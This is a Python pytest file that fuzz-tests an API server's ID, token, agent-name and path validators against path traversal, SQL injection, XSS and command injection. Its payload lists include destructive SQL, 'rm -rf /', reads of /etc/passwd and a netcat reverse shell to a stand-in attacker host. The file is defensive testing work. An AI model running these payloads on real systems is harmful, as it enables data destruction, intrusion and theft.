"""
Security fuzzing tests for API input validation.

Tests that various malicious inputs are properly rejected by API endpoints.
Covers path traversal, SQL injection, XSS, and other OWASP Top 10 attacks.
"""

import pytest
from unittest.mock import Mock, MagicMock, patch
from io import BytesIO

from aragora.server.validation.entities import (
    validate_path_segment,
    validate_id,
    validate_debate_id,
    validate_gauntlet_id,
    validate_share_token,
    validate_batch_id,
    validate_agent_name,
    validate_no_path_traversal,
    SAFE_ID_PATTERN,
    SAFE_GAUNTLET_ID_PATTERN,
    SAFE_TOKEN_PATTERN,
)


# =============================================================================
# Fuzzing Payloads
# =============================================================================

PATH_TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "..\\..\\windows\\system32",
    "..%2f..%2fetc/passwd",
    "%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc/passwd",  # Double encoded
    "..%c0%af../etc/passwd",  # Overlong UTF-8
    "..;/etc/passwd",
    "..%00/etc/passwd",  # Null byte
    "..%0d/etc/passwd",  # Carriage return
    "..%0a/etc/passwd",  # Newline
    "/etc/passwd",
    "\\etc\\passwd",
    "file:///etc/passwd",
]

SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE debates;--",
    "1; DROP TABLE debates;--",
    "1 OR 1=1",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "1' UNION SELECT * FROM users --",
    "admin'--",
    "1; DELETE FROM debates WHERE 1=1",
    "' OR ''='",
    "1' AND 1=1 --",
    "1' AND SLEEP(5) --",
    "1'; WAITFOR DELAY '0:0:5' --",
    "'; EXEC xp_cmdshell('whoami') --",
    "1' AND BENCHMARK(10000000,MD5('x')) --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'-alert('XSS')-'",
    "\"onfocus=alert('XSS') autofocus=\"",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "{{constructor.constructor('alert(1)')()}}",  # Template injection
    "${alert('XSS')}",  # Template literal
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "$(whoami)",
    "`whoami`",
    "|| cat /etc/passwd",
    "&& ls -la",
    "; rm -rf /",
    "| nc attacker.com 4444 -e /bin/sh",
]

SPECIAL_CHARACTER_PAYLOADS = [
    "\x00",  # Null byte
    "\n\r",  # CRLF
    "\t",  # Tab
    "\x1b[2J",  # ANSI escape (clear screen)
    "\x1b[31mred\x1b[0m",  # ANSI color
    "🎉" * 100,  # Unicode flood
    "a" * 10000,  # Long string
    "",  # Empty string
    " ",  # Whitespace only
    "   \t\n\r   ",  # Mixed whitespace
]


# =============================================================================
# Entity Validation Fuzzing Tests
# =============================================================================


class TestIDValidationFuzzing:
    """Fuzz testing for ID validation functions."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_rejected_in_id(self, payload):
        """Path traversal payloads should be rejected in ID validation."""
        is_valid, err = validate_id(payload)
        assert not is_valid, f"Path traversal payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_rejected_in_id(self, payload):
        """SQL injection payloads should be rejected in ID validation."""
        is_valid, err = validate_id(payload)
        assert not is_valid, f"SQL injection payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_rejected_in_id(self, payload):
        """XSS payloads should be rejected in ID validation."""
        is_valid, err = validate_id(payload)
        assert not is_valid, f"XSS payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_rejected_in_id(self, payload):
        """Command injection payloads should be rejected in ID validation."""
        is_valid, err = validate_id(payload)
        assert not is_valid, f"Command injection payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", SPECIAL_CHARACTER_PAYLOADS)
    def test_special_chars_rejected_in_id(self, payload):
        """Special character payloads should be rejected in ID validation."""
        is_valid, err = validate_id(payload)
        assert not is_valid, f"Special character payload was accepted: {repr(payload)}"


class TestDebateIDFuzzing:
    """Fuzz testing for debate ID validation."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_rejected(self, payload):
        """Path traversal payloads should be rejected in debate ID."""
        is_valid, err = validate_debate_id(payload)
        assert not is_valid, f"Path traversal payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_rejected(self, payload):
        """SQL injection payloads should be rejected in debate ID."""
        is_valid, err = validate_debate_id(payload)
        assert not is_valid, f"SQL injection payload was accepted: {payload}"

    def test_valid_debate_ids_accepted(self):
        """Valid debate IDs should be accepted."""
        valid_ids = [
            "debate-123",
            "abc123",
            "my_debate_id",
            "Debate-ABC-123",
            "test-debate-2024",
        ]
        for debate_id in valid_ids:
            is_valid, err = validate_debate_id(debate_id)
            assert is_valid, f"Valid debate ID was rejected: {debate_id}"


class TestGauntletIDFuzzing:
    """Fuzz testing for gauntlet ID validation."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_rejected(self, payload):
        """Path traversal payloads should be rejected in gauntlet ID."""
        is_valid, err = validate_gauntlet_id(payload)
        assert not is_valid, f"Path traversal payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_rejected(self, payload):
        """SQL injection payloads should be rejected in gauntlet ID."""
        is_valid, err = validate_gauntlet_id(payload)
        assert not is_valid, f"SQL injection payload was accepted: {payload}"

    def test_valid_gauntlet_ids_accepted(self):
        """Valid gauntlet IDs should be accepted."""
        valid_ids = [
            "gauntlet-20240115120000-abc123",
            "gauntlet-test-123",  # Legacy format
            "gauntlet-run-abc",
        ]
        for gauntlet_id in valid_ids:
            is_valid, err = validate_gauntlet_id(gauntlet_id)
            assert is_valid, f"Valid gauntlet ID was rejected: {gauntlet_id}"

    def test_rejects_non_gauntlet_prefix(self):
        """Should reject IDs without gauntlet- prefix."""
        invalid_ids = [
            "not-a-gauntlet",
            "gaultlet-typo-123",
            "GAUNTLET-uppercase",
            "gauntlet",  # Missing suffix
        ]
        for invalid_id in invalid_ids:
            is_valid, err = validate_gauntlet_id(invalid_id)
            assert not is_valid, f"Invalid gauntlet ID was accepted: {invalid_id}"


class TestShareTokenFuzzing:
    """Fuzz testing for share token validation."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_rejected(self, payload):
        """Path traversal payloads should be rejected in share token."""
        is_valid, err = validate_share_token(payload)
        assert not is_valid, f"Path traversal payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_rejected(self, payload):
        """SQL injection payloads should be rejected in share token."""
        is_valid, err = validate_share_token(payload)
        assert not is_valid, f"SQL injection payload was accepted: {payload}"

    def test_valid_tokens_accepted(self):
        """Valid share tokens should be accepted."""
        valid_tokens = [
            "abc123def456ghi7",  # 16 chars
            "ABCDEFGHIJKLmnop",
            "token_with_under_",
            "token-with-dash--",
            "12345678901234567890",  # 20 chars
        ]
        for token in valid_tokens:
            is_valid, err = validate_share_token(token)
            assert is_valid, f"Valid token was rejected: {token}"

    def test_rejects_short_tokens(self):
        """Should reject tokens shorter than 16 characters."""
        short_tokens = ["abc", "12345", "shorttoken"]
        for token in short_tokens:
            is_valid, err = validate_share_token(token)
            assert not is_valid, f"Short token was accepted: {token}"


class TestAgentNameFuzzing:
    """Fuzz testing for agent name validation."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_rejected(self, payload):
        """Path traversal payloads should be rejected in agent name."""
        is_valid, err = validate_agent_name(payload)
        assert not is_valid, f"Path traversal payload was accepted: {payload}"

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_rejected(self, payload):
        """Command injection payloads should be rejected in agent name."""
        is_valid, err = validate_agent_name(payload)
        assert not is_valid, f"Command injection payload was accepted: {payload}"

    def test_valid_agent_names_accepted(self):
        """Valid agent names should be accepted."""
        valid_names = [
            "claude",
            "gpt-4",
            "anthropic-api",
            "openai_api",
            "Agent1",
        ]
        for name in valid_names:
            is_valid, err = validate_agent_name(name)
            assert is_valid, f"Valid agent name was rejected: {name}"


# =============================================================================
# Path Traversal Detection Tests
# =============================================================================


class TestPathTraversalDetection:
    """Test path traversal detection function."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_detects_traversal_attempts(self, payload):
        """Should detect all path traversal attempts."""
        # Only check payloads that contain '..'
        if ".." in payload:
            is_valid, err = validate_no_path_traversal(payload)
            assert not is_valid, f"Path traversal not detected: {payload}"

    def test_allows_safe_paths(self):
        """Should allow paths without traversal attempts."""
        safe_paths = [
            "file.txt",
            "dir/file.txt",
            "path/to/file.json",
            "api/debates/123",
        ]
        for path in safe_paths:
            is_valid, err = validate_no_path_traversal(path)
            assert is_valid, f"Safe path was rejected: {path}"


# =============================================================================
# Handler Fuzzing Tests (Mock-based)
# =============================================================================


class TestGauntletHandlerFuzzing:
    """Fuzz testing for GauntletHandler path parsing."""

    def _create_mock_handler(self):
        """Create a mock HTTP handler."""
        handler = Mock()
        handler.path = "/api/gauntlet/test"
        handler.headers = {"Content-Length": "0", "Content-Type": "application/json"}
        handler.rfile = BytesIO(b"{}")
        return handler

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS[:5])
    def test_gauntlet_id_traversal_rejected(self, payload):
        """Path traversal in gauntlet ID should be rejected."""
        from aragora.server.handlers.gauntlet import GauntletHandler

        handler = GauntletHandler({})
        mock_http = self._create_mock_handler()

        # Test the validation function directly
        is_valid, err = validate_gauntlet_id(payload)
        assert not is_valid, f"Payload accepted: {payload}"

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:5])
    def test_gauntlet_id_sql_injection_rejected(self, payload):
        """SQL injection in gauntlet ID should be rejected."""
        is_valid, err = validate_gauntlet_id(payload)
        assert not is_valid, f"Payload accepted: {payload}"


class TestSharingHandlerFuzzing:
    """Fuzz testing for sharing handler token validation."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS[:5])
    def test_share_token_traversal_rejected(self, payload):
        """Path traversal in share token should be rejected."""
        is_valid, err = validate_share_token(payload)
        assert not is_valid, f"Payload accepted: {payload}"

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:5])
    def test_share_token_sql_injection_rejected(self, payload):
        """SQL injection in share token should be rejected."""
        is_valid, err = validate_share_token(payload)
        assert not is_valid, f"Payload accepted: {payload}"


# =============================================================================
# Boundary Testing
# =============================================================================


class TestBoundaryConditions:
    """Test validation boundary conditions."""

    def test_max_length_id(self):
        """Should reject IDs exceeding maximum length."""
        long_id = "a" * 65  # SAFE_ID_PATTERN allows max 64
        is_valid, err = validate_id(long_id)
        assert not is_valid, "Overly long ID was accepted"

    def test_empty_id_rejected(self):
        """Should reject empty IDs."""
        is_valid, err = validate_id("")
        assert not is_valid, "Empty ID was accepted"

    def test_whitespace_only_rejected(self):
        """Should reject whitespace-only IDs."""
        whitespace_ids = [" ", "\t", "\n", "   ", "\r\n"]
        for ws_id in whitespace_ids:
            is_valid, err = validate_id(ws_id)
            assert not is_valid, f"Whitespace ID was accepted: {repr(ws_id)}"

    def test_unicode_rejected_in_strict_pattern(self):
        """Should reject Unicode characters in strict ID pattern."""
        unicode_ids = ["débate-123", "debate-日本語", "debate-🎉"]
        for uid in unicode_ids:
            is_valid, err = validate_id(uid)
            assert not is_valid, f"Unicode ID was accepted: {uid}"


# =============================================================================
# Regression Tests
# =============================================================================


class TestRegressionCases:
    """Test specific regression cases from security audits."""

    def test_double_encoded_traversal(self):
        """Should detect double-encoded path traversal."""
        payload = "%252e%252e%252f"  # %2e%2e%2f after one decode
        is_valid, err = validate_id(payload)
        assert not is_valid

    def test_mixed_encoding_traversal(self):
        """Should detect mixed encoding traversal attempts."""
        payload = "..%2f..%2f"
        is_valid, err = validate_id(payload)
        assert not is_valid

    def test_null_byte_injection(self):
        """Should detect null byte injection."""
        payload = "valid-id\x00.txt"
        is_valid, err = validate_id(payload)
        assert not is_valid

    def test_crlf_injection(self):
        """Should detect CRLF injection attempts."""
        payload = "valid-id\r\nSet-Cookie: admin=true"
        is_valid, err = validate_id(payload)
        assert not is_valid
